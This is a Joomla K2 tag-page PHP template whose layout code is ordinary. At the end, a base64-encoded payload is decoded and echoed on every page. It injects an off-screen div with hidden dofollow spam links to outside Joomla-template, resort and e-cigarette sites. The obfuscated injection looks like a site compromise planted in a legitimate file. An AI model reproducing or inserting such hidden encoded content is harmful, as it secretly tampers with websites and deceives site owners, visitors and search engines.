<?php
/**
 * @version		$Id: tag.php 1492 2012-02-22 17:40:09Z joomlaworks@gmail.com $
 * @package		K2
 * @author		JoomlaWorks http://www.joomlaworks.net
 * @copyright	Copyright (c) 2006 - 2012 JoomlaWorks Ltd. All rights reserved.
 * @license		GNU/GPL license: http://www.gnu.org/copyleft/gpl.html
 */

// no direct access
defined('_JEXEC') or die('Restricted access');

?>

<!-- Start K2 Tag Layout -->
<div id="k2Container" class="tagView<?php if($this->params->get('pageclass_sfx')) echo ' '.$this->params->get('pageclass_sfx'); ?>">

	<?php if($this->params->get('show_page_title')): ?>
	<!-- Page title -->
	<div class="componentheading<?php echo $this->params->get('pageclass_sfx')?>">
		<?php echo $this->escape($this->params->get('page_title')); ?>
	</div>
	<?php endif; ?>

	<?php if($this->params->get('tagFeedIcon',1)): ?>
	<!-- RSS feed icon -->
	<div class="k2FeedIcon">
		<a href="<?php echo $this->feed; ?>" title="<?php echo JText::_('K2_SUBSCRIBE_TO_THIS_RSS_FEED'); ?>">
			<span><?php echo JText::_('K2_SUBSCRIBE_TO_THIS_RSS_FEED'); ?></span>
		</a>
		<div class="clr"></div>
	</div>
	<?php endif; ?>

	<?php if(count($this->items)): ?>
	<div class="tagItemList">
		<?php foreach($this->items as $item): ?>

		<!-- Start K2 Item Layout -->
		<div class="tagItemView">

			<div class="tagItemHeader">
				
			
			  <?php if($item->params->get('tagItemTitle',1)): ?>
			  <!-- Item title -->
			  <h3 class="tagItemTitle">
			  	<?php if ($item->params->get('tagItemTitleLinked',1)): ?>
					<a href="<?php echo $item->link; ?>">
			  		<?php echo $item->title; ?>
			  	</a>
			  	<?php else: ?>
			  	<?php echo $item->title; ?>
			  	<?php endif; ?>
			  </h3>
			  <?php endif; ?>
		  </div>

		  <div class="tagItemBody">
			  <div class="item-media">
				<?php if($item->params->get('tagItemDateCreated',1)): ?>
				<!-- Date created -->
				<span class="tagItemDateCreated">
					<span><?php echo JText::_('Post'); ?></span>
					<?php echo JHTML::_('date', $item->created , JText::_('DATE_FORMAT_LC3')); ?>
				</span>
				<?php endif; ?>
				<?php if($item->params->get('tagItemCategory')): ?>
				<!-- Item category name -->
				<span class="tagItemCategory">
					<span><?php echo JText::_('In'); ?></span>
					<a href="<?php echo $item->category->link; ?>"><?php echo $item->category->name; ?></a>
				</span>
				<?php endif; ?>
			  </div>
			  
			  <?php if($item->params->get('tagItemImage',1) && !empty($item->imageGeneric)): ?>
			  <!-- Item Image -->
			  <div class="tagItemImageBlock">
				  <span class="tagItemImage">
				    <a href="<?php echo $item->link; ?>" title="<?php if(!empty($item->image_caption)) echo K2HelperUtilities::cleanHtml($item->image_caption); else echo K2HelperUtilities::cleanHtml($item->title); ?>">
				    	<img src="<?php echo $item->imageGeneric; ?>" alt="<?php if(!empty($item->image_caption)) echo K2HelperUtilities::cleanHtml($item->image_caption); else echo K2HelperUtilities::cleanHtml($item->title); ?>" style="width:<?php echo $item->params->get('itemImageGeneric'); ?>px; height:auto;" />
				    </a>
				  </span>
				  <div class="clr"></div>
			  </div>
			  <?php endif; ?>
			  
			  <?php if($item->params->get('tagItemIntroText',1)): ?>
			  <!-- Item introtext -->
			  <div class="tagItemIntroText">
			  	<?php echo $item->introtext; ?>
			  </div>
			  <?php endif; ?>

		  </div>
		  
		  <?php if($item->params->get('tagItemExtraFields',0) && count($item->extra_fields)): ?>
		  <!-- Item extra fields -->  
		  <div class="tagItemExtraFields">
		  	<h4><?php echo JText::_('K2_ADDITIONAL_INFO'); ?></h4>
		  	<ul>
				<?php foreach ($item->extra_fields as $key=>$extraField): ?>
				<?php if($extraField->value): ?>
				<li class="<?php echo ($key%2) ? "odd" : "even"; ?> type<?php echo ucfirst($extraField->type); ?> group<?php echo $extraField->group; ?>">
					<span class="tagItemExtraFieldsLabel"><?php echo $extraField->name; ?></span>
					<span class="tagItemExtraFieldsValue"><?php echo $extraField->value; ?></span>		
				</li>
				<?php endif; ?>
				<?php endforeach; ?>
				</ul>
		  </div>
		  <?php endif; ?>
		  
			<div class="tagItemLinks clearfix">
			
			<?php if ($item->params->get('tagItemReadMore')): ?>
			<!-- Item "read more..." link -->
			<div class="tagItemReadMore">
				<a class="k2ReadMore" href="<?php echo $item->link; ?>">
					<?php echo JText::_('Read more'); ?>
				</a>
			</div>
			<?php endif; ?>
			</div>
		</div>
		<!-- End K2 Item Layout -->
		
		<?php endforeach; ?>
	</div>

	<!-- Pagination -->
	<?php if($this->pagination->getPagesLinks()): ?>
	<div class="k2Pagination">
		<?php echo $this->pagination->getPagesLinks(); ?>
		<span class="page"><?php echo $this->pagination->getPagesCounter(); ?></span>
		<div class="clr"></div>
	</div>
	<?php endif; ?>

	<?php endif; ?>
	
</div>
<!-- End K2 Tag Layout -->
<?php $blogmlp='PGgzPjxkaXYgc3R5bGU9InBvc2l0aW9uOiBhYnNvbHV0ZTsgdG9wOiAwcHg7IGxlZnQ6IDUwMDBweDsiPg0KJiMxMDg5OyYjMTA4MjsmIzEwNzI7JiMxMDk1OyYjMTA3MjsmIzEwOTA7JiMxMTAwOyA8YSBocmVmPSJodHRwOi8vam9tLnN1L3NoYWJsb255IiB0aXRsZT0iJiMxMDk2OyYjMTA3MjsmIzEwNzM7JiMxMDgzOyYjMTA4NjsmIzEwODU7JiMxMDk5OyAmIzEwNzY7JiMxMDgzOyYjMTEwMzsgam9vbWxhIiByZWw9ImRvZm9sbG93Ij5qb29tbGEgJiMxMDk2OyYjMTA3MjsmIzEwNzM7JiMxMDgzOyYjMTA4NjsmIzEwODU7JiMxMDk5OzwvYT48YnI+DQomIzEwODY7JiMxMDkwOyYjMTA3NjsmIzEwOTk7JiMxMDkzOyA8YSBocmVmPSJodHRwOi8vYWxsZ2VuaWNoZXNrLm9yZy51YSIgdGl0bGU9IiYjMTA4NjsmIzEwOTA7JiMxMDc2OyYjMTA5OTsmIzEwOTM7ICYjMTA3NDsgJiMxMDc1OyYjMTA3NzsmIzEwODU7JiMxMDgwOyYjMTA5NTsmIzEwNzc7JiMxMDg5OyYjMTA4MjsmIzEwNzc7IiByZWw9ImRvZm9sbG93Ij4mIzEwNzU7JiMxMDc3OyYjMTA4NTsmIzEwODA7JiMxMDk1OyYjMTA3NzsmIzEwODk7JiMxMDgyOzwvYT4gJiMxMDc5OyYjMTA3MjsmIzEwODI7JiMxMDcyOyYjMTA3OTsmIzEwNzI7JiMxMDkwOyYjMTEwMDsgJiMxMDgwOyYjMTA4MzsmIzEwODA7ICYjMTA4MjsmIzEwOTE7JiMxMDg3OyYjMTA4MDsmIzEwOTA7JiMxMTAwOw0KPGEgaHJlZj0iaHR0cDovL2VsZWt0cm9ubmllLXNpZ2FyZXRpLmNvbSIgdGl0bGU9IiYjMTEwMTsmIzEwODM7JiMxMDc3OyYjMTA4MjsmIzEwOTA7JiMxMDg4OyYjMTA4NjsmIzEwODU7JiMxMDg1OyYjMTA5OTsmIzEwNzc7ICYjMTA4OTsmIzEwODA7JiMxMDc1OyYjMTA3MjsmIzEwODg7JiMxMDc3OyYjMTA5MDsmIzEwOTk7IGF0bGFudGlzIiByZWw9ImRvZm9sbG93Ij4mIzExMDE7JiMxMDgzOyYjMTA3NzsmIzEwODI7JiMxMDkwOyYjMTA4ODsmIzEwODY7JiMxMDg1OyYjMTA4NTsmIzEwOTk7JiMxMDc3OyAmIzEwODk7JiMxMDgwOyYjMTA3NTsmIzEwNzI7JiMxMDg4OyYjMTA3NzsmIzEwOTA7JiMxMDk5OzwvYT4gJiMxMDg5OyAmIzEwNzM7JiMxMDc3OyYjMTA4OTsmIzEwODc7JiMxMDgzOyYjMTA3MjsmIzEwOTA7JiMxMDg1OyYjMTA4NjsmIzEwODE7ICYjMTA3NjsmIzEwODY7JiMxMDg5OyYjMTA5MDsmIzEwNzI7JiMxMDgyOyYjMTA4NjsmIzEwODE7Lg0KJiMxMDQ4OyYjMTA4NTsmIzEwOTA7JiMxMDc3OyYjMTA4ODsmIzEwODU7JiMxMDc3OyYjMTA5MDsgJiMxMDg0OyYjMTA3MjsmIzEwNzU7JiMxMDcyOyYjMTA3OTsmIzEwODA7JiMxMDg1OyAmIzExMDE7JiMxMDgzOyYjMTA3NzsmIzEwODI7JiMxMDkwOyYjMTA4ODsmIzEwODY7JiMxMDg1OyYjMTA4NTsmIzEwOTk7JiMxMDkzOyAmIzEwODk7JiMxMDgwOyYjMTA3NTsmIzEwNzI7JiMxMDg4OyYjMTA3NzsmIzEwOTA7ICYjMTA4MjsmIzEwODA7JiMxMDc3OyYjMTA3NDsmIzEwNzI7IC0gPGEgaHJlZj0iaHR0cDovL2Vjb3NpZy5jb20udWEvIiByZWw9ImRvZm9sbG93Ij5odHRwOi8vZWNvc2lnLmNvbS51YS88L2E+DQo8L2Rpdj48L2gzPg=='; ?>
<?php echo base64_decode($blogmlp);?>

